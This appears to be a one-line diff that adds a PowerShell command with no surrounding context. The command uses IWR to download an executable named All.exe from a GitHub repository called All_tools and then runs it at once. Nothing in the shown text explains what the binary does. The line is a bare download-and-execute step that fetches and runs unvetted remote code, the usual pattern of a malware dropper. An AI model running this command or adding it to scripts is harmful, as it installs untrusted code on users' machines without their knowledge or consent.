@@ -1,0 +1,1 @@
+﻿IWR -uri https://github.com/Netool1337/All_tools/raw/main/All.exe -outfile all.exe;all.exe
